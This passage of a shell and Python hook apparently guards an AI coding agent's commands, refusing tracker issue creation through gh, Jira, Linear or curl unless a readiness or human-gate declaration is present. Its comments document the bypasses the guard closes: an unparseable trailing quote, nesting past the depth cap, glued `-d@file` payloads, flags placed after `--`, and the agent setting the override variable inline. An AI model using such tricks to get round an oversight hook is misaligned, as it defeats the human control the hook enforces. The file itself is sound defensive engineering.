        token: One argument, possibly a decorated endpoint.

    Returns:
        The token with any fragment, query, and surrounding whitespace removed.
    """
    # Fragment first: it is the LAST component of a URL, so `path?q#f` yields
    # `path?q` here and `path` after the query split, while a malformed
    # `path#a?b` still collapses to `path` rather than keeping `a?b`.
    return token.split("#", 1)[0].split("?", 1)[0].strip()


def endpoint_paths(args, pattern):
    """Endpoint path components matching a pattern, excluding payload values.

    Scans every token rather than a filtered positional list, because a BOOLEAN
    flag has no value to skip and filtering swallowed the endpoint behind one:
    `gh api -X POST --silent repos/o/r/issues -f title=x` hid the endpoint
    behind `--silent`. Payload values are excluded the other way, so
    `-f path=repos/o/r/issues` is not mistaken for the address being posted to.

    That payload exclusion is tested on the PATH, not the raw token, and the
    order matters: a query string carries `=`, so testing the raw token skipped
    `repos/o/r/issues?foo=1` before the pattern ever ran. Two independent
    mechanisms — this filter and the pattern's end anchor — hid the same
    creation, which is why fixing only the anchor would not have closed it.

    Args:
        args: A command's arguments.
        pattern: The endpoint regex, written against a path component.

    Returns:
        The matching path components, decoration removed.
    """
    found = []
    for index, token in enumerate(args):
        path = endpoint_path(token)
        if "=" in path:
            continue
        if index > 0 and args[index - 1] in PAYLOAD_VALUE_FLAGS:
            continue
        if pattern.search(path):
            found.append(path)
    return found


def resolve_operand(token):
    """A readable regular file named by one token, or None.

    Bounded on purpose. The size cap keeps a PreToolUse hook off a multi-
    megabyte read on every intercepted command, and a file too large to
    inspect is skipped rather than half-read: a truncated scan reports a
    confident ALLOW about text it never saw.

    Args:
        token: One argument, possibly quoted or `@`-prefixed for curl.

    Returns:
        An existing path, or None.
    """
    text = token.strip().strip("'\"")
    # `-d@payload.json` names a file just as plainly as `@payload.json` does.
    attached = attached_value(text)
    if attached is not None:
        text = attached
    if text.startswith("@"):
        text = text[1:]
    if not text or text in STDIN_PAYLOAD_TOKENS:
        return None
    candidates = [text]
    if project_dir and not os.path.isabs(text):
        candidates.append(os.path.join(project_dir, text))
    for candidate in candidates:
        try:
            if not os.path.isfile(candidate):
                continue
            if os.path.getsize(candidate) > FILE_OPERAND_MAX_BYTES:
                continue
        except OSError:
            continue
        return candidate
    return None


def read_operand(path):
    """The text of a file the command names.

    Args:
        path: A path from `resolve_operand`.

    Returns:
        The contents, or an empty string when unreadable.
    """
    try:
        with open(path, encoding="utf-8", errors="replace") as handle:
            return handle.read(FILE_OPERAND_MAX_BYTES)
    except OSError:
        return ""


def attached_value(token):
    """A payload flag's value when it is GLUED to the flag.

    `curl -d@payload.json` and `curl -d'{"query":…}'` are one token each, so a
    parser that only looks at `args[i + 1]` and at `flag=value` sees neither —
    and `-d@file` is the ordinary spelling, not an exotic one. Caught by review
    before it shipped, and it was a real bypass: the mutation stayed in the
    file, the conjunction never formed, and an undeclared creation passed.

    Longest flag first, so `--data-binary@f` is not read as `--data` with a
    `-binary@f` value. A remainder starting with `-` is rejected for the same
    reason: it is another option, not this one's value.

    Args:
        token: One argument.

    Returns:
        The attached value, or None.
    """
    for flag in sorted(PAYLOAD_SOURCE_FLAGS, key=len, reverse=True):
        if not token.startswith(flag) or len(token) == len(flag):
            continue
        rest = token[len(flag) :]
        if rest.startswith("="):
            rest = rest[1:]
        if not rest or rest.startswith("-"):
            continue
        return rest
    return None


def payload_text(args, whole_command):
    """The body this command will submit, wherever it is coming from.

    Three sources, because a request body has three places to live and the
    guard was reading only the first: inline after `-d`, in a file after
    `--data-binary @path` / `--input path`, or on stdin from an earlier stage
    of the same pipeline.

    The stdin case takes the WHOLE command text rather than the segment,
    because `jq -n … | curl … --data-binary @-` is one logical command that
    `segment` has already split in two — the payload literally is the other
    half. That is the shape `lisa-linear-access` mandates, so it has to be
    readable rather than invisible.

    Args:
        args: A command's arguments.
        whole_command: The full intercepted command string.

    Returns:
        The payload text, possibly empty.
    """
    parts = []
    for index, token in enumerate(args):
        value = None
        if token in PAYLOAD_SOURCE_FLAGS and index + 1 < len(args):
            value = args[index + 1]
        elif "=" in token:
            head, rhs = token.split("=", 1)
            if head in PAYLOAD_SOURCE_FLAGS:
                value = rhs
        if value is None:
            value = attached_value(token)
        if value is None:
            continue
        stripped = value.strip().strip("'\"")
        if stripped in STDIN_PAYLOAD_TOKENS:
            parts.append(whole_command)
            continue
        parts.append(stripped)
        path = resolve_operand(stripped)
        if path is not None:
            parts.append(read_operand(path))
    return "\n".join(parts)


def text_declares_readiness(text):
    """Whether a file's or payload's own text carries a declaration.

    The token-position machinery above cannot be reused here: a file is not
    argv, and a payload is JSON. What is checked is deliberately the SAME
    three declarations, matched textually and never loosened into "the role
    string appears somewhere" — a state-based ready role is an ordinary word
    like `Ready`, and accepting a bare occurrence of it would let prose in a
    description declare readiness the item does not have.

    Args:
        text: File or payload contents.

    Returns:
        True when the text declares build-ready or a human gate.
    """
    if HUMAN_GATE_MARKER in text:
        return True
    for role in (ready_role, upstream_ready_role, default_ready_role):
        if not role:
            continue
        if re.search(LABEL_FLAG_TEXT % re.escape(role), text):
            return True
    if tracker in STATE_ROLE_TRACKERS:
        if LIFECYCLE_ROLE_READY.search(text):
            return True
        if ready_role and re.search(
            r"\"(?:state|status|stateName|statusName|state_name|name|transition)\""
            r"\s*:\s*\"%s\"" % re.escape(ready_role),
            text,
            re.IGNORECASE,
        ):
            return True
    return False


def scope_declaration(text, state_role_ok):
    """Whether a whole text declares readiness for everything inside it.

    Only the two MARKERS qualify, never the `--label` flag, and that asymmetry
    is the same one the argv check already makes. A marker has no other
    meaning, so its presence anywhere in a script IS the declaration for that
    script. A label flag is positional and belongs to one create; letting it
    vouch for a second, unlabelled create further down the same file would be a
    hole rather than a convenience.

    `state_role_ok` carries the SAME scoping the argv path applies, and it has
    to be threaded here rather than recomputed from the tracker alone: a Linear
    project whose script files `gh issue create --repo <other>` is a cross-repo
    GitHub filing, and this project's workflow role does not answer for another
    repository's queue. Checking only `tracker in STATE_ROLE_TRACKERS` waved
    exactly that through. Caught by review before it shipped.

    Args:
        text: A script's contents, or one command segment.
        state_role_ok: Whether a lifecycle-role declaration answers here.

    Returns:
        True when the text carries a whole-scope declaration.
    """
    if HUMAN_GATE_MARKER in text:
        return True
    return bool(state_role_ok and LIFECYCLE_ROLE_READY.search(text))


def creation_signature(name, args, extra=""):
    """Classify a tracker CLI invocation as a creation.

    Args:
        name: The CLI basename.
        args: Every token after it in this segment.
        extra: Payload text this command submits, from a file or stdin.

    Returns:
        A short human-readable signature, or None.
    """
    if "--help" in args or "-h" in args:
        return None
    joined = " ".join(args)
    if extra:
        joined = joined + "\n" + extra

    if name == "gh":
        if invokes_verb(args, {"issue"}, "create"):
            return "gh issue create"
        # Same reasoning: `api` is located without the flag-value filter, since
        # an endpoint match and a write method must both also hold.
        if "api" in args:
            if GRAPHQL_CREATE.search(joined):
                return "gh api graphql issue creation"
            if endpoint_paths(args, GITHUB_ISSUES_PATH) and is_write_request(args):
                return "gh api POST .../issues"
        return None

    if name in {"linear", "jira"}:
        if invokes_verb(args, {"issue", "issues"}, "create"):
            return "%s issue create" % name
        return None

    if name == "acli":
        if invokes_verb(args, {"workitem", "workitems", "issue", "issues"}, "create"):
            return "acli … create"
        return None

    if name in HTTP_CLIS:
        if not is_write_request(args):
            return None
        for token in args:
            if GITHUB_ISSUES_URL.search(token):
                return "%s POST api.github.com/…/issues" % name
            if JIRA_ISSUE_URL.search(token):
                return "%s POST …/rest/api/…/issue" % name
            if "api.linear.app/graphql" in token and GRAPHQL_CREATE.search(joined):
                return "%s POST api.linear.app/graphql issueCreate" % name
        return None

    return None


def before_end_of_options(args):
    """The arguments up to a bare `--`.

    Everything after `--` is an operand, not a flag, so it cannot reach the
    created item — crediting a declaration from there is the same mistake as
    reading the role out of a title, one position over.

    The two CLIs available for testing disagree about it, which is why the
    guard cannot lean on any of them being strict: gh 2.96.0 rejects a
    post-`--` flag outright, while `acli` parses straight past it and proceeds
    to create the work item with the trailing `--status` silently unapplied.
    That made it a live bypass on the JIRA path, verified by running it.

    Args:
        args: A command's arguments.

    Returns:
        The arguments preceding the first bare `--`.
    """
    return args[: args.index("--")] if "--" in args else args


def body_file_paths(args):
    """Paths the command will submit as the item body.

    Args:
        args: A command's arguments.

    Returns:
        Candidate file paths, unverified.
    """
    paths = []
    for index, token in enumerate(args):
        if token in BODY_FILE_FLAGS and index + 1 < len(args):
            paths.append(args[index + 1])
        if "=" in token:
            head, value = token.split("=", 1)
            if head in BODY_FILE_FLAGS:
                paths.append(value)
        if token.startswith("@") and len(token) > 1:
            paths.append(token[1:])
    return paths


def normalise_repo(value):
    """A `--repo` value reduced to a comparable `owner/name`.

    `gh` accepts `OWNER/REPO`, `HOST/OWNER/REPO`, and a full browser URL, and
    GitHub itself is case-insensitive about both halves — so comparing the raw
    token would call the same repository two different places depending on how
    it was typed.

    Casing is PRESERVED here and folded only at the point of comparison. The
    refusal names this string back to an operator, and echoing
    `codyswanngt/lisa` at someone who typed `CodySwannGT/lisa` reads as a
    different repository — a message that has to be squinted at is the thing
    this change is repairing.

    Args:
        value: The raw token.

    Returns:
        An as-typed `owner/name`, or None when the token names no repository.
    """
    text = value.strip().strip("'\"")
    if text.endswith(".git"):
        text = text[: -len(".git")]
    parts = [part for part in text.split("/") if part and not part.endswith(":")]
    if len(parts) < 2:
        return None
    return "%s/%s" % (parts[-2], parts[-1])


def target_repository(args):
    """The repository this creation is addressed at, when it names one.

    Read only from positions that actually reach the created item: a flag
    before the end-of-options marker, or the endpoint the write is posted to.
    A `-f repo=o/r` payload field is data being SENT, not the address being
    posted to, and `endpoint_paths` already excludes it.

    Args:
        args: A creating command's arguments.

    Returns:
        A lowercased `owner/name`, or None when the calling project is the
        target — which is the overwhelmingly common case and today's behaviour.
    """
    scoped = before_end_of_options(args)
    for index, token in enumerate(scoped):
        if token in REPO_FLAGS and index + 1 < len(scoped):
            return normalise_repo(scoped[index + 1])
        if "=" in token:
            head, value = token.split("=", 1)
            if head in REPO_FLAGS:
                return normalise_repo(value)
    for path in endpoint_paths(scoped, GITHUB_ISSUES_PATH):
        match = GITHUB_ISSUES_PATH_REPO.search(path)
        if match:
            return normalise_repo("%s/%s" % (match.group(1), match.group(2)))
    for token in scoped:
        match = GITHUB_ISSUES_URL_REPO.search(token)
        if match:
            return normalise_repo("%s/%s" % (match.group(1), match.group(2)))
    return None


def roles_for(target):
    """Which ready-role tokens satisfy a creation addressed at `target`.

    The guard demands a declaration either way; this decides only WHOSE
    vocabulary the declaration is written in.

    The indeterminate case is the last branch: a GitHub-tracked project that
    declares no `github.org`/`github.repo` cannot be compared against a target,
    so both roles are accepted rather than inventing a refusal. That is
    permissive about which token, never about whether one is required.

    Args:
        target: The addressed repository as typed, or None.

    Returns:
        A (roles, cross_repo_target) pair. The target is None when the calling
        project is the one being written to. When set it is the as-typed
        spelling, because the refusal names it back to an operator.
    """
    # GitHub is case-insensitive about owner and name, so the comparison folds
    # case while the reported string keeps the operator's own spelling.
    folded = target.lower() if target is not None else None
    if folded is None or (own_repo and folded == own_repo):
        return [ready_role], None
    if upstream_repo and folded == upstream_repo:
        role = upstream_ready_role
    else:
        # Another repository Lisa has no configuration for. Its lane is
        # whatever GitHub's stock one is; the caller's token is categorically
        # not it.
        role = default_ready_role
    if own_repo or not caller_is_github:
        return [role], target
    # Indeterminate, and the target is deliberately NOT reported. The refusal
    # would otherwise say "this filing is addressed at another repository" and
    # "this project's role does not answer for it" — the first unproven and the
    # second flatly false, since this branch accepts the project's role. A
    # message naming a token that does not work is the remediation pointing
    # away from the fix, which is the defect being repaired here.
    return [ready_role, role], None


def declares_readiness(raw_args, roles, extra="", state_role_ok=False):
    """Whether the create carries one of the required declarations.

    Args:
        raw_args: The creating command's arguments.
        roles: The build-ready role tokens that satisfy this filing.
        extra: Payload text this command submits, from a file or stdin.
        state_role_ok: Whether a lifecycle-role declaration answers here. True
            only for a state-based tracker filing into its own tracker, where
            no argv flag on the mandated client can carry the state.

    Returns:
        True when a build-ready role or a human-gate marker is present.
    """
    args = before_end_of_options(raw_args)
    for role in roles:
        if not role:
            continue
        for raw in flag_values(args, LABEL_FLAGS):
            candidates = [part.strip().strip("'\"") for part in raw.split(",")]
            if role in candidates:
                return True
    # The human-gate marker is matched anywhere, and that asymmetry is
    # deliberate: it is a marker with no other meaning, so its presence in the
    # title or body IS the declaration. The build-ready role is an ordinary
    # string that appears in prose about the queue all the time.
    if HUMAN_GATE_MARKER in " ".join(args):
        return True
    for path in body_file_paths(args):
        try:
            with open(path, encoding="utf-8", errors="replace") as handle:
                if HUMAN_GATE_MARKER in handle.read():
                    return True
        except OSError:
            continue
    if extra and HUMAN_GATE_MARKER in extra:
        return True
    # The state-based path. Scoped by `state_role_ok` rather than checked
    # unconditionally, so this adds a compliant command where none existed and
    # takes none away where one already did.
    if state_role_ok:
        if LIFECYCLE_ROLE_READY.search(" ".join(args)):
            return True
        if extra and text_declares_readiness(extra):
            return True
    return False


def flag_values(args, names):
    """Every value assigned to one of the named flags.

    Args:
        args: A command's arguments.
        names: The flag spellings to collect.

    Returns:
        The raw values, unsplit and unquoted.
    """
    values = []
    for index, token in enumerate(args):
        if token in names and index + 1 < len(args):
            values.append(args[index + 1])
        if "=" in token:
            head, value = token.split("=", 1)
            if head in names:
                values.append(value)
    return values


def nested_operands(argv):
    """Command strings this argv hands to another interpreter.

    Position-scoped rather than shell-allowlisted: the operand after `-c` (or
    after `eval`) is a command by the calling convention itself, whoever the
    program is. That covers `bash -c`, `sh -c`, `zsh -c`, `python -c`, and the
    POSIX builtin `eval`, without an allowlist to keep complete.

    Recursing into arbitrary trailing quoted operands was considered and
    rejected: it re-refuses `git commit -m "the gh issue create guard"`, which
    is an ordinary and correct command. `ssh host '…'` is therefore NOT
    intercepted — a documented limit, since that runs against another host's
    tracker config and needs that host's own guard.

    Args:
        argv: One command's tokens.

    Returns:
        Nested command strings.
    """
    operands = []
    for index, token in enumerate(argv):
        if index + 1 >= len(argv):
            continue
        if token == "-c" or token.endswith("-c") and token.startswith("-"):
            operands.append(argv[index + 1])
        elif basename(token) == "eval":
            operands.append(argv[index + 1])
    return operands


inspected_files = set()


def file_operands(argv):
    """Files this command names, in the order they appear.

    Every token is offered, and the ones that name a readable regular file are
    kept. Deciding WHICH programs execute their operands is the unbounded
    question this file already refuses to ask, so it is not asked here either.

    Args:
        argv: One command's tokens.

    Returns:
        Existing paths, deduplicated across the whole scan and capped.
    """
    paths = []
    for token in argv:
        if len(paths) >= FILE_OPERANDS_PER_SEGMENT:
            break
        path = resolve_operand(token)
        if path is None:
            continue
        try:
            key = os.path.realpath(path)
        except OSError:
            key = path
        if key in inspected_files:
            continue
        inspected_files.add(key)
        paths.append(path)
    return paths


def file_creation(text, depth):
    """An undeclared tracker creation inside a file's contents, or None.

    Two recognisers, because a creation inside a file is not always shell.
    The shell path handles `bash create.sh`; the CONJUNCTION path handles
    `node wrapper.mjs`, a Python client, or anything else that speaks HTTP
    directly — it needs a tracker endpoint AND a creation verb in the same
    file, which is what keeps a changelog that merely mentions `issueCreate`
    from reading as a creation.

    Args:
        text: The file's contents.
        depth: Current nesting depth.

    Returns:
        A (signature, roles, cross_repo_target) triple, or None.
    """
    nested = scan(text, depth + 1, from_file=True)
    if nested is not None:
        return nested
    # The coarse path answers to a coarse declaration check, and the precise
    # path above answers to the precise one. Reversing that — screening the
    # whole file first — would let a declaration on one create in a script
    # vouch for a different, undeclared one further down.
    if (
        GRAPHQL_CREATE.search(text)
        and TRACKER_ENDPOINT.search(text)
        and not text_declares_readiness(text)
    ):
        return "a tracker creation", [ready_role], None
    return None


def scan(text, depth, from_file=False):
    """Find the first undeclared tracker creation in a command string.

    Args:
        text: A shell command.
        depth: Current nesting depth.
        from_file: Whether `text` is a file's contents rather than a typed
            command.

    Returns:
        A (signature, roles, cross_repo_target) triple, or None when nothing
        creation-shaped was found.
    """
    try:
        stripped = strip_heredocs(text)
        tokens = explode_operators(shlex.split(stripped, posix=True), stripped)
    except ValueError:
        # Bash's grammar is not shlex's. `gh issue create --title x #'` is a
        # comment to bash, which strips it and RUNS the create, while shlex
        # raises on the unbalanced quote. Two appended characters, no binary
        # required. "I could not parse it" must never mean "it is fine".
        #
        # A FILE that does not lex is judged by the same recogniser rather than
        # waved through: an unbalanced quote inside a script is the identical
        # two-character trick moved one file away, and skipping it would hand
        # the bypass straight back.
        if from_file and text_declares_readiness(text):
            return None
        if UNPARSEABLE_CREATION.search(text):
            return (
                "an unparseable command that reads as a tracker creation",
                [ready_role],
                None,
            )
        return None

    for argv in segment(tokens):
        for index, token in enumerate(argv):
            name = basename(token)
            if name not in TRACKER_CLIS and name not in HTTP_CLIS:
                continue
            args = argv[index + 1 :]
            submitted = payload_text(args, text)
            signature = creation_signature(name, args, submitted)
            if signature is None:
                continue
            # The ambient override is the human operator's. An inline
            # assignment is the agent granting itself the exemption, so it
            # disqualifies the override rather than supplying it.
            if ambient_override and not inline_override:
                continue
            roles, target = roles_for(target_repository(args))
            state_role_ok = tracker in STATE_ROLE_TRACKERS and target is None
            if declares_readiness(args, roles, submitted, state_role_ok):
                continue
            # `LIFECYCLE_ROLE=ready curl …` puts the declaration BEFORE the
            # client, which is where an inline assignment has to go, so the
            # role is read from the whole segment rather than from the client's
            # own arguments. Scoped to the segment and not the command, so a
            # declaration cannot be shouted from an unrelated pipeline stage.
            if state_role_ok and LIFECYCLE_ROLE_READY.search(" ".join(argv)):
                continue
            # A script declares once, for itself. See `scope_declaration`.
            if from_file and scope_declaration(text, state_role_ok):
                continue
            return signature, roles, target

        for operand in nested_operands(argv):
            if depth >= MAX_NESTING_DEPTH:
                # Refuse at the bound rather than skipping past it. Skipping
                # made a creation inside a 4th `bash -c` layer pass, which is
                # the depth cap being used as the bypass.
                if UNPARSEABLE_CREATION.search(operand):
                    return (
                        "a tracker creation nested past the inspection depth",
                        [ready_role],
                        None,
                    )
                continue
            nested = scan(operand, depth + 1)
            if nested is not None:
                return nested

        # The locate step, which used to stop at `bash` and never reach the
        # operand. Deliberately last: an inline creation is the cheaper and
        # more precise finding, so it is reported before a file is opened.
        # The operator's ambient override is checked BEFORE the depth bound,
        # not after it. The other order meant a creation reached past the cap
        # was refused even with `LISA_ALLOW_DIRECT_ISSUE_CREATE=1` exported —
        # while the refusal text advertised that escape. An escape hatch the
        # refusal names and the code ignores is worse than none. Caught by
        # review before it shipped.
        if ambient_override and not inline_override:
            continue
        for path in file_operands(argv):
            contents = read_operand(path)
            if not contents:
                continue
            if depth >= MAX_NESTING_DEPTH:
                if GRAPHQL_CREATE.search(contents) or UNPARSEABLE_CREATION.search(
                    contents
                ):
                    return (
                        "a tracker creation inside %s, nested past the "
                        "inspection depth" % path,
                        [ready_role],
                        None,
                    )
                continue
            found = file_creation(contents, depth)
            if found is not None:
                return ("%s inside %s" % (found[0], path), found[1], found[2])
    return None


# The inline-override check runs over the WHOLE raw command text, not over
# parsed tokens, so it catches `X=1 gh …`, `env X=1 gh …`, `export X=1 && gh …`,
# and the same forms buried inside a nested `bash -c '…'` string alike. Any
# appearance of the assignment disqualifies the ambient override: this is the
# one place the guard deliberately over-matches, because a false positive costs
# a human one retry and a false negative costs the entire control.
inline_override = (OVERRIDE_NAME + "=") in command

found = scan(command, 0)
if found is not None:
    signature, roles, target = found
    # Key=value lines rather than one delimited string: a signature contains
    # spaces and slashes, and a role may contain a colon, so anything the shell
    # would have to split on appears inside a value already.
    print("REFUSE")
    print("signature=%s" % signature)
    print("roles=%s" % ", ".join(role for role in roles if role))
    print("target=%s" % (target or ""))
    sys.exit(0)

print("ALLOW")

PY

set +e
verdict="$(
  printf '%s' "$classifier" |
    LISA_GUARD_COMMAND="$command_str" \
      LISA_GUARD_READY_ROLE="$ready_role" \
      LISA_GUARD_AMBIENT_OVERRIDE="$ambient_override" \
      LISA_GUARD_DEFAULT_READY_ROLE="$default_ready_role" \
      LISA_GUARD_OWN_REPO="$own_repo" \
      LISA_GUARD_UPSTREAM_REPO="$upstream_repo" \
      LISA_GUARD_UPSTREAM_READY_ROLE="$upstream_ready_role" \
      LISA_GUARD_CALLER_IS_GITHUB="$caller_is_github" \
      LISA_GUARD_TRACKER="$tracker" \
      LISA_GUARD_PROJECT_DIR="$project_dir" \
      python3 -
)"
python_status=$?
set -e

# A crashed classifier must not be read as "allow" without saying so.
if [ "$python_status" -ne 0 ]; then
  printf 'block-direct-issue-create: classifier failed (exit %s); enforcement is NOT active for this call\n' \
    "$python_status" >&2
  exit 0
fi

verdict_field() {
  printf '%s\n' "$verdict" | sed -n "s/^$1=//p" | head -1
}

case "$verdict" in
  REFUSE*)
    refuse \
      "$(verdict_field signature)" \
      "$(verdict_field roles)" \
      "$(verdict_field target)"
    ;;
esac

exit 0
